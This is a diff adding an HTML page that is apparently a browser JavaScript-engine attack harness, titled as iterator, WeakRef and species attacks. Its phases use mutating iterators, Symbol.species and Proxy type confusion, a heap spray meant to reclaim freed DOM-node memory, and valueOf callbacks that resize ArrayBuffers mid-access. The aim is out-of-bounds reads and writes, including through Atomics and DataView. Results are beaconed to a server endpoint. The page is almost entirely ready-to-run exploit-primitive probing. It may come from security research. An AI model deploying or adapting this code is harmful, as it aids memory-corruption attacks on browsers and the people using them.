@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>P1057</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0e14;color:#c8d0da;font:11px/1.5 monospace;padding:10px}
+#hud{background:#111820;border:1px solid #1e2a3a;border-radius:6px;padding:10px;max-height:95vh;overflow-y:auto}
+.ok{color:#22c55e}.fail{color:#ef4444}.warn{color:#f59e0b}.info{color:#38bdf8}
+</style></head><body>
+<div id="hud"><div id="log"></div></div>
+<div id="sandbox" style="position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden"></div>
+<script>
+var _rl='';
+setInterval(function(){
+  try{var x=new XMLHttpRequest();x.open('GET','/reload.txt?'+Date.now(),false);x.send();
+    if(x.status===200){var v=x.responseText.trim();if(_rl&&v!==_rl)location.reload(true);_rl=v;}
+  }catch(e){}
+},2500);
+
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET','/beacon.php?tag=P1057-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);x.send();}catch(e){}}
+var L=document.getElementById('log');
+function log(m,c){var d=document.createElement('div');if(c)d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+var SB=document.getElementById('sandbox');
+
+bn('BOOT','ts='+Date.now().toString(36));
+log('=== P1057: Iterator/WeakRef/Species Attacks ===','info');
+
+var totalAnomalies=0;
+var anomalyItems=[];
+
+function hexq(v){
+  if(typeof v==='bigint')return '0x'+v.toString(16).padStart(16,'0');
+  return '0x'+(v>>>0).toString(16).padStart(8,'0');
+}
+
+// ============================================================
+// PHASE A: Iterator protocol abuse
+// ============================================================
+function phaseA(){
+  log('--- Phase A: Iterator Protocol Abuse ---','info');
+  var details=[];
+  var anomalies=0;
+
+  // A1: Array.from with iterator that mutates source
+  try{
+    var arr=[1,2,3,4,5,6,7,8];
+    var iter={
+      [Symbol.iterator]:function(){
+        var i=0;
+        return{
+          next:function(){
+            if(i===4){
+              // Truncate array mid-iteration
+              arr.length=2;
+            }
+            if(i<8) return{value:arr[i++],done:false};
+            return{done:true};
+          }
+        };
+      }
+    };
+    var result=Array.from(iter);
+    details.push('A1-from='+JSON.stringify(result));
+    // Check for OOB values (undefined after truncation is expected, but stale pointers are not)
+    for(var j=0;j<result.length;j++){
+      if(result[j]!==undefined&&typeof result[j]!=='number'){
+        anomalies++;
+        anomalyItems.push('A1-stale-'+j+':'+typeof result[j]);
+      }
+    }
+  }catch(e){details.push('A1-err='+e.name);}
+
+  // A2: Set constructor with mutating iterator
+  try{
+    var setArr=[10,20,30,40,50];
+    var setIter={
+      [Symbol.iterator]:function(){
+        var i=0;
+        return{
+          next:function(){
+            if(i===2){
+              // Add more elements during construction
+              setArr.push(60,70,80);
+            }
+            if(i<setArr.length) return{value:setArr[i++],done:false};
+            return{done:true};
+          }
+        };
+      }
+    };
+    var s=new Set(setIter);
+    details.push('A2-set=size:'+s.size+'|vals:'+Array.from(s).join(','));
+  }catch(e){details.push('A2-err='+e.name);}
+
+  // A3: Map constructor with iterator that returns non-pair
+  try{
+    var mapIter={
+      [Symbol.iterator]:function(){
+        var i=0;
+        var items=[['a',1],['b',2],null,['c',3],undefined,[],['d']];
+        return{
+          next:function(){
+            if(i<items.length) return{value:items[i++],done:false};
+            return{done:true};
+          }
+        };
+      }
+    };
+    try{
+      var m=new Map(mapIter);
+      details.push('A3-map=size:'+m.size);
+    }catch(e){
+      details.push('A3-map='+e.name);
+    }
+  }catch(e){details.push('A3-err='+e.name);}
+
+  // A4: Promise.all with mutating iterable
+  try{
+    var promises=[Promise.resolve(1),Promise.resolve(2),Promise.resolve(3)];
+    var pIter={
+      [Symbol.iterator]:function(){
+        var i=0;
+        return{
+          next:function(){
+            if(i===1){
+              // Replace remaining promises
+              promises[2]=Promise.reject(new Error('injected'));
+            }
+            if(i<promises.length) return{value:promises[i++],done:false};
+            return{done:true};
+          }
+        };
+      }
+    };
+    Promise.all(pIter).then(function(r){
+      details.push('A4-all='+JSON.stringify(r));
+    }).catch(function(e){
+      details.push('A4-all=rejected:'+e.message);
+    });
+  }catch(e){details.push('A4-err='+e.name);}
+
+  // A5: Spread with getter-triggered mutation on array-like
+  try{
+    var al={length:10};
+    for(var k=0;k<10;k++) al[k]=k;
+    Object.defineProperty(al,3,{
+      get:function(){
+        // Modify length during spread read
+        this.length=5;
+        return 'MODIFIED';
+      }
+    });
+    var spread=Array.from(al);
+    details.push('A5-spread='+JSON.stringify(spread));
+  }catch(e){details.push('A5-err='+e.name);}
+
+  // A6: for-of with iterator that returns done:false but value is a getter
+  try{
+    var count6=0;
+    var iter6={
+      [Symbol.iterator]:function(){
+        return{
+          next:function(){
+            count6++;
+            if(count6>100) return{done:true};
+            return{
+              get done(){return count6>5;},
+              get value(){
+                // Side effect in value getter
+                return count6;
+              }
+            };
+          }
+        };
+      }
+    };
+    var vals6=[];
+    for(var v of iter6) vals6.push(v);
+    details.push('A6-getter-iter='+vals6.join(',')+'|count='+count6);
+  }catch(e){details.push('A6-err='+e.name);}
+
+  log('Phase A: '+details.slice(0,3).join(' | '),'info');
+  bn('A-ITERATOR',details.join('|'));
+  return new Promise(function(resolve){
+    setTimeout(function(){
+      totalAnomalies+=anomalies;
+      resolve(anomalies);
+    },100);
+  });
+}
+
+// ============================================================
+// PHASE B: Symbol.species confusion
+// ============================================================
+function phaseB(){
+  log('');log('--- Phase B: Symbol.species Confusion ---','info');
+  var details=[];
+  var anomalies=0;
+
+  // B1: Array species returning TypedArray
+  try{
+    var MyArray=function(){};
+    MyArray[Symbol.species]=Int32Array;
+    var arr=new Array(1,2,3);
+    arr.constructor=MyArray;
+    try{
+      var sliced=arr.slice(0,2);
+      details.push('B1-type='+Object.prototype.toString.call(sliced)+'|len='+sliced.length);
+      if(sliced instanceof Int32Array){
+        anomalies++;
+        anomalyItems.push('B1-species-typed');
+        log('B1: Array.slice returned TypedArray via species!','warn');
+      }
+    }catch(e){
+      details.push('B1-slice='+e.name);
+    }
+  }catch(e){details.push('B1-err='+e.name);}
+
+  // B2: Promise species returning non-Promise
+  try{
+    var FakePromise=function(exec){exec(function(){},function(){});};
+    FakePromise[Symbol.species]=function(exec){
+      // Return a plain object instead of a Promise
+      exec(function(){},function(){});
+      return{then:function(f){f(42);}};
+    };
+    var p=Promise.resolve(1);
+    p.constructor=FakePromise;
+    var chained=p.then(function(v){return v*2;});
+    details.push('B2-species='+(chained instanceof Promise));
+  }catch(e){details.push('B2-err='+e.name);}
+
+  // B3: RegExp species that changes match behavior
+  try{
+    var OrigRegExp=RegExp;
+    var callCount=0;
+    function SpyRegExp(p,f){
+      callCount++;
+      return new OrigRegExp(p,f);
+    }
+    SpyRegExp[Symbol.species]=SpyRegExp;
+    SpyRegExp.prototype=OrigRegExp.prototype;
+    var re=/test/g;
+    re.constructor=SpyRegExp;
+    var result='test test test'.split(re);
+    details.push('B3-split='+JSON.stringify(result)+'|calls='+callCount);
+  }catch(e){details.push('B3-err='+e.name);}
+
+  // B4: TypedArray species cross-type
+  try{
+    var ta=new Float64Array([1.1,2.2,3.3]);
+    ta.constructor={};
+    ta.constructor[Symbol.species]=BigInt64Array;
+    try{
+      var sub=ta.subarray(0,2);
+      details.push('B4-type='+Object.prototype.toString.call(sub)+'|len='+sub.length);
+      if(sub instanceof BigInt64Array){
+        anomalies++;
+        anomalyItems.push('B4-cross-type');
+        log('B4: Float64Array.subarray returned BigInt64Array!','fail');
+        // This would be a type confusion — reading float bits as bigint
+        details.push('B4-val='+sub[0]);
+      }
+    }catch(e){
+      details.push('B4-sub='+e.name);
+    }
+  }catch(e){details.push('B4-err='+e.name);}
+
+  // B5: ArrayBuffer species
+  try{
+    var ab=new ArrayBuffer(64);
+    ab.constructor={};
+    ab.constructor[Symbol.species]=function(len){
+      // Return a SMALLER buffer
+      return new ArrayBuffer(8);
+    };
+    try{
+      var sliced=ab.slice(0,32);
+      details.push('B5-slice-len='+sliced.byteLength);
+      if(sliced.byteLength<32){
+        anomalies++;
+        anomalyItems.push('B5-small-slice');
+        log('B5: AB.slice returned smaller buffer!','fail');
+      }
+    }catch(e){
+      details.push('B5-slice='+e.name);
+    }
+  }catch(e){details.push('B5-err='+e.name);}
+
+  totalAnomalies+=anomalies;
+  log('Phase B: anomalies='+anomalies+' | '+details.slice(0,4).join(' | '),'info');
+  bn('B-SPECIES','anomalies='+anomalies+'|'+details.join('|'));
+  return Promise.resolve(anomalies);
+}
+
+// ============================================================
+// PHASE C: WeakRef on DOM nodes + spray
+// ============================================================
+function phaseC(){
+  log('');log('--- Phase C: WeakRef DOM + Spray ---','info');
+  return new Promise(function(resolve){
+    var details=[];
+    var anomalies=0;
+
+    // C1: Create DOM nodes, WeakRef them, remove from DOM, GC, check
+    var refs=[];
+    var nodeCount=50;
+    for(var i=0;i<nodeCount;i++){
+      var div=document.createElement('div');
+      div.textContent='node-'+i+'-'+('x'.repeat(256)); // ~256 byte payload
+      div.setAttribute('data-idx',i);
+      SB.appendChild(div);
+      refs.push({wr:new WeakRef(div),idx:i});
+    }
+
+    // Remove all from DOM
+    SB.innerHTML='';
+
+    // GC pressure
+    var pressure=[];
+    for(var i=0;i<100000;i++) pressure.push({x:i,buf:new ArrayBuffer(64)});
+    pressure=null;
+
+    // Check which are collected
+    var alive=0,dead=0;
+    for(var i=0;i<refs.length;i++){
+      if(refs[i].wr.deref()) alive++;
+      else dead++;
+    }
+    details.push('C1-alive='+alive+'|dead='+dead);
+
+    if(dead>0){
+      log('C1: '+dead+'/'+nodeCount+' DOM nodes collected by GC!','warn');
+
+      // C2: Now spray with ArrayBuffers of similar size to reclaim freed slots
+      var sprays=[];
+      for(var s=0;s<500;s++){
+        var ab=new ArrayBuffer(256);
+        var u8=new Uint8Array(ab);
+        // Fill with marker
+        for(var j=0;j<256;j++) u8[j]=0x41;
+        sprays.push(ab);
+      }
+
+      // Check if any WeakRef suddenly resolves to something wrong
+      var confused=0;
+      for(var i=0;i<refs.length;i++){
+        var node=refs[i].wr.deref();
+        if(node){
+          // Node is still alive — check its type
+          if(!(node instanceof HTMLDivElement)){
+            confused++;
+            anomalies++;
+            anomalyItems.push('C2-confused-'+i+':'+typeof node);
+            log('C2 TYPE CONFUSION: WeakRef['+i+'] is '+typeof node+' not HTMLDivElement!','fail');
+          }
+          // Check data integrity
+          try{
+            var idx=node.getAttribute('data-idx');
+            if(parseInt(idx)!==refs[i].idx){
+              confused++;
+              anomalies++;
+              anomalyItems.push('C2-dataCorrupt-'+i);
+              log('C2 DATA CORRUPT: expected idx='+refs[i].idx+' got '+idx,'fail');
+            }
+          }catch(e){}
+        }
+      }
+      details.push('C2-confused='+confused);
+      sprays=null;
+    }
+
+    // C3: Second GC round with more pressure
+    var pressure2=[];
+    for(var i=0;i<200000;i++) pressure2.push(new ArrayBuffer(128));
+    pressure2=null;
+
+    var alive2=0,dead2=0;
+    for(var i=0;i<refs.length;i++){
+      if(refs[i].wr.deref()) alive2++;
+      else dead2++;
+    }
+    details.push('C3-alive='+alive2+'|dead='+dead2);
+
+    totalAnomalies+=anomalies;
+    log('Phase C: dead1='+dead+' dead2='+dead2+' confused='+0,'ok');
+    bn('C-WEAKDOM',details.join('|'));
+    resolve(anomalies);
+  });
+}
+
+// ============================================================
+// PHASE D: Proxy type confusion
+// ============================================================
+function phaseD(){
+  log('');log('--- Phase D: Proxy Type Confusion ---','info');
+  var details=[];
+  var anomalies=0;
+
+  // D1: Proxy masquerading as TypedArray
+  try{
+    var ab=new ArrayBuffer(64);
+    var real=new Int32Array(ab);
+    real[0]=0xDEADBEEF;
+
+    var fake=new Proxy(real,{
+      get:function(t,p){
+        if(p==='length') return 1000000; // Lie about length
+        if(p==='buffer') return new ArrayBuffer(1000000); // Fake buffer
+        if(p==='byteLength') return 4000000;
+        if(p==='byteOffset') return 0;
+        return Reflect.get(t,p);
+      }
+    });
+
+    // Try to use this proxy where a TypedArray is expected
+    try{
+      var copied=Int32Array.from(fake);
+      details.push('D1-from-proxy=len:'+copied.length);
+      if(copied.length>16){
+        details.push('D1-excess-read=YES');
+        // Check if we read past the real buffer
+        var oobValues=0;
+        for(var i=16;i<Math.min(copied.length,100);i++){
+          if(copied[i]!==0) oobValues++;
+        }
+        details.push('D1-oob-nonzero='+oobValues);
+        if(oobValues>0){
+          anomalies++;
+          anomalyItems.push('D1-oob-read');
+          log('D1: Read '+oobValues+' non-zero values past real buffer!','fail');
+        }
+      }
+    }catch(e){
+      details.push('D1-from='+e.name);
+    }
+  }catch(e){details.push('D1-err='+e.name);}
+
+  // D2: Proxy on Array that changes behavior during sort
+  try{
+    var sortArr=[5,3,1,4,2];
+    var sortProxy=new Proxy(sortArr,{
+      get:function(t,p){
+        if(p==='length'&&t._phase===2) return 100; // Lie about length in phase 2
+        return Reflect.get(t,p);
+      },
+      set:function(t,p,v){
+        return Reflect.set(t,p,v);
+      }
+    });
+    sortArr._phase=1;
+    try{
+      sortProxy.sort(function(a,b){
+        sortArr._phase=2; // Switch phase during sort
+        return a-b;
+      });
+      details.push('D2-sorted='+Array.from(sortProxy).slice(0,10).join(','));
+    }catch(e){
+      details.push('D2-sort='+e.name);
+    }
+  }catch(e){details.push('D2-err='+e.name);}
+
+  // D3: Proxy as prototype of TypedArray
+  try{
+    var ta=new Uint8Array(16);
+    ta[0]=0xFF;
+    var protoProxy=new Proxy({},{
+      get:function(t,p){
+        if(typeof p==='string'&&/^\d+$/.test(p)){
+          return 0x42; // All numeric accesses return 0x42
+        }
+        return undefined;
+      }
+    });
+    Object.setPrototypeOf(ta,protoProxy);
+    // Now accessing past the buffer length might return proxy values instead of undefined
+    var pastEnd=ta[100]; // Past end of 16-byte buffer
+    details.push('D3-pastEnd='+(pastEnd===undefined?'undefined':pastEnd));
+    if(pastEnd===0x42){
+      details.push('D3-proxy-intercept=YES');
+    }
+    // Verify real data still works
+    details.push('D3-real='+ta[0]);
+    // Restore prototype
+    Object.setPrototypeOf(ta,Uint8Array.prototype);
+  }catch(e){details.push('D3-err='+e.name);}
+
+  // D4: Proxy with has trap on TypedArray (affects 'in' operator)
+  try{
+    var ta4=new Int32Array(4);
+    var hasProxy=new Proxy(ta4,{
+      has:function(t,p){
+        return true; // Claim every property exists
+      },
+      get:function(t,p){
+        if(typeof p==='string'&&!isNaN(p)&&parseInt(p)>=4){
+          return 0xCAFE; // Return fake values for OOB indices
+        }
+        return Reflect.get(t,p);
+      }
+    });
+    details.push('D4-has100='+(100 in hasProxy));
+    details.push('D4-get100='+hasProxy[100]);
+    // Try Array.from with the proxy
+    try{
+      var fromProxy=Array.from({length:10},function(_,i){return hasProxy[i];});
+      details.push('D4-from='+fromProxy.join(','));
+    }catch(e){
+      details.push('D4-from-err='+e.name);
+    }
+  }catch(e){details.push('D4-err='+e.name);}
+
+  totalAnomalies+=anomalies;
+  log('Phase D: anomalies='+anomalies,'ok');
+  bn('D-PROXY','anomalies='+anomalies+'|'+details.join('|'));
+  return Promise.resolve(anomalies);
+}
+
+// ============================================================
+// PHASE E: toString/valueOf during critical ops
+// ============================================================
+function phaseE(){
+  log('');log('--- Phase E: Coercion Side Effects ---','info');
+  var details=[];
+  var anomalies=0;
+
+  // E1: valueOf during TypedArray index access
+  try{
+    var ab=new ArrayBuffer(64,{maxByteLength:1024});
+    var ta=new Int32Array(ab);
+    for(var i=0;i<16;i++) ta[i]=i+1;
+
+    var evilIdx={
+      valueOf:function(){
+        // Resize during index computation!
+        ab.resize(8); // Shrink to 8 bytes (2 ints)
+        return 10; // Return OOB index
+      }
+    };
+
+    try{
+      var v=ta[evilIdx];
+      details.push('E1-read='+v);
+      if(v!==undefined&&v!==0){
+        anomalies++;
+        anomalyItems.push('E1-oob-'+v);
+        log('E1 OOB READ via valueOf resize: '+v,'fail');
+      }
+    }catch(e){
+      details.push('E1-read-err='+e.name);
+    }
+
+    // Reset
+    ab.resize(64);
+    for(var i=0;i<16;i++) ta[i]=i+1;
+
+    // E1b: Write with valueOf resize
+    var evilIdx2={
+      valueOf:function(){
+        ab.resize(8);
+        return 10;
+      }
+    };
+    try{
+      ta[evilIdx2]=0xBEEF;
+      details.push('E1b-write=OK');
+      // Check if we wrote OOB
+      ab.resize(64);
+      if(ta[10]===0xBEEF){
+        anomalies++;
+        anomalyItems.push('E1b-oob-write');
+        log('E1b OOB WRITE via valueOf resize!','fail');
+      }else{
+        details.push('E1b-ta10='+ta[10]);
+      }
+    }catch(e){
+      details.push('E1b-write-err='+e.name);
+    }
+  }catch(e){details.push('E1-err='+e.name);}
+
+  // E2: valueOf during Atomics operations
+  try{
+    var ab2=new ArrayBuffer(64,{maxByteLength:1024});
+    var ta2=new Int32Array(ab2);
+    for(var i=0;i<16;i++) ta2[i]=0xF000+i;
+
+    var evilAtomicIdx={
+      valueOf:function(){
+        ab2.resize(8);
+        return 10;
+      }
+    };
+
+    try{
+      var av=Atomics.load(ta2,evilAtomicIdx);
+      details.push('E2-atomicRead='+hexq(av));
+      if(av!==undefined&&av!==0){
+        anomalies++;
+        anomalyItems.push('E2-atomic-oob');
+        log('E2 ATOMIC OOB READ via valueOf: '+hexq(av),'fail');
+      }
+    }catch(e){
+      details.push('E2-atomic='+e.name);
+    }
+
+    ab2.resize(64);
+    for(var i=0;i<16;i++) ta2[i]=0xF000+i;
+
+    var evilAtomicVal={
+      valueOf:function(){
+        ab2.resize(8);
+        return 0xCAFEBABE;
+      }
+    };
+
+    try{
+      Atomics.store(ta2,10,evilAtomicVal);
+      details.push('E2b-atomicWrite=OK');
+      ab2.resize(64);
+      if(ta2[10]===0xCAFEBABE){
+        anomalies++;
+        anomalyItems.push('E2b-atomic-oob-write');
+        log('E2b ATOMIC OOB WRITE via valueOf!','fail');
+      }
+    }catch(e){
+      details.push('E2b-atomic='+e.name);
+    }
+  }catch(e){details.push('E2-err='+e.name);}
+
+  // E3: toString during Map key comparison
+  try{
+    var mapResized=false;
+    var rab3=new ArrayBuffer(128,{maxByteLength:1024});
+    var key={
+      toString:function(){
+        if(!mapResized){
+          mapResized=true;
+          rab3.resize(16);
+        }
+        return 'key';
+      }
+    };
+    var m=new Map();
+    m.set(key,'value');
+    var result=m.get(key);
+    details.push('E3-map='+result+'|resized='+mapResized);
+  }catch(e){details.push('E3-err='+e.name);}
+
+  // E4: DataView with valueOf index
+  try{
+    var rab4=new ArrayBuffer(64,{maxByteLength:1024});
+    var dv=new DataView(rab4);
+    dv.setInt32(0,0x41414141);
+
+    var evilOffset={
+      valueOf:function(){
+        rab4.resize(4);
+        return 32; // OOB after resize
+      }
+    };
+
+    try{
+      var dvVal=dv.getInt32(evilOffset);
+      details.push('E4-dv='+hexq(dvVal));
+      if(dvVal!==undefined){
+        anomalies++;
+        anomalyItems.push('E4-dv-oob');
+        log('E4 DATAVIEW OOB via valueOf: '+hexq(dvVal),'fail');
+      }
+    }catch(e){
+      details.push('E4-dv='+e.name);
+    }
+  }catch(e){details.push('E4-err='+e.name);}
+
+  totalAnomalies+=anomalies;
+  log('Phase E: anomalies='+anomalies,'ok');
+  bn('E-COERCION','anomalies='+anomalies+'|'+details.join('|'));
+  return Promise.resolve(anomalies);
+}
+
+// ============================================================
+// Run
+// ============================================================
+setTimeout(function(){
+  phaseA().then(function(){
+    return phaseB();
+  }).then(function(){
+    return phaseC();
+  }).then(function(){
+    return phaseD();
+  }).then(function(){
+    return phaseE();
+  }).then(function(){
+    log('');
+    log('=== P1057 COMPLETE: total anomalies = '+totalAnomalies+' ===',totalAnomalies>0?'fail':'ok');
+    if(anomalyItems.length>0) log('Items: '+anomalyItems.join(', '),'warn');
+    bn('DONE','anomalies='+totalAnomalies+'|items='+anomalyItems.join(';'));
+  }).catch(function(e){
+    log('FATAL: '+e.message,'fail');
+    bn('FATAL',e.message);
+  });
+},200);
+</script></body></html>
